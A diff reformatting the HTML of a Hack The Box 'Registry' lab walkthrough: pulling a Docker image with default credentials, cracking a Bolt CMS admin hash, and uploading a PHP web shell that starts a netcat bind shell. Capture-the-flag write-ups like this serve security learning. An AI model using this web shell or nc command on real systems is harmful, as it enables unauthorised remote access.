@@ -389,8 +389,8 @@ OS and Service detection performed. Please report any incorrect results at https
 </code></pre><p>A single repo exists, as you can see, with the name: <code>bolt-image</code></p>
 <p>Now to see if we can pull this image. According to <a href="https://5ysk3y.github.io/htb/guides/registry/" target="_blank">this</a>
  pulling an image requires you to get two things: the image manifest and something called associated layer files. Layer files are a bit like chunked archives; you have a number of them that contain different parts of a wider data set. Once you have them all, you typically have what resembles an entire image. First off, to get the manifest, you visit:</p>
-<pre><code>http://docker.registry.htb/v2/&lt;name&gt;/manifests/&lt;reference&gt;
-</code></pre><p>We have the <code>&lt;name&gt;</code> (bolt-image) but the reference we needed was obtained using this:</p>
+<p><code>http://docker.registry.htb/v2/&lt;name&gt;/manifests/&lt;reference&gt;</code></p>
+<p>We have the <code>&lt;name&gt;</code> (bolt-image) but the reference we needed was obtained using this:</p>
 <pre><code> ~/HTB/Boxes/Registry curl http://docker.registry.htb/v2/bolt-image/tags/list -H &quot;Authorization: Basic YWRtaW46YWRtaW4=&quot;
 {&quot;name&quot;:&quot;bolt-image&quot;,&quot;tags&quot;:[&quot;latest&quot;]}
 </code></pre><p>The reference was the tag shown: <code>latest</code>.</p>
@@ -442,7 +442,8 @@ interact
 <p>Upon logging in we get the user flag! Epic. We also have a direct login to the bolt user.</p>
 <pre><code>bolt@bolt:~$ wc -c user.txt
 33 user.txt
-</code></pre><h1 id="root-pwn">Root Pwn<a href="#root-pwn" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+</code></pre><hr>
+<h1 id="root-pwn">Root Pwn<a href="#root-pwn" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Now we have a shell on the box, we can run an enumeration script to get a handle on things. There was nothing in the Bolt home folder that peaked my interest so I decided to run LinEnum which exposes a few interesting things. If we recall, earlier on, we stumbled across a CMS named Bolt that had an authenticated CVE - LinEmum gives us a way to potentially get around this by highlighting the <code>bolt.db</code> file that the CMS is using to store data:</p>
 <pre><code>/var/www/html/bolt/tests/phpunit/unit/resources/db:
 total 92K
@@ -461,8 +462,8 @@ $2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK
 <p>N.B - the associated user for this password was <code>admin</code></p>
 </blockquote>
 <p>Running this through Hashcat gets us a password:</p>
-<pre><code>$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK : strawberry
-</code></pre><p>I&rsquo;ll also note another file I spotted through LinEnum located here:</p>
+<p><code>$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK : strawberry</code></p>
+<p>I&rsquo;ll also note another file I spotted through LinEnum located here:</p>
 <p><code>/var/www/html/backup.php</code></p>
 <p>The contents of this are actually fairly interesting:</p>
 <pre><code>bolt@bolt:/var/www/html$ cat backup.php
@@ -488,9 +489,8 @@ Poking around on the <a href="https://docs.bolt.cm/3.7/manual/login" target="_bl
 &lt;?php
 system('/dev/shm/nc -e /bin/bash -lvnp 9001');
 ?&gt;
-</code></pre><p><strong>4)</strong> Run the script via a browser to start the listener on the box, e.g:</p>
-<pre><code>http://10.10.10.159/bolt/files/exploit.php
-</code></pre><p><strong>5)</strong> Connect from local machine, e.g;</p>
+</code></pre><p><strong>4)</strong> Run the script via a browser to actually setup the listener on the box (e.g. http://10.10.10.159/bolt/files/exploit.php)</p>
+<p><strong>5)</strong> Connect from local machine, e.g;</p>
 <p><code>skynet Registry/bolt » nc 10.10.10.159 9001</code></p>
 <p>We now have a shell as the www-data user. I opted to quickly run another LinEnum scan with this user but, whilst that ran, I also decided to try some of the basics that didn&rsquo;t work using our bolt user, namely our ability to run <code>sudo -l</code> to list commands we can run, via that user, with sudo:</p>
 <pre><code>www-data@bolt:~$ sudo -l
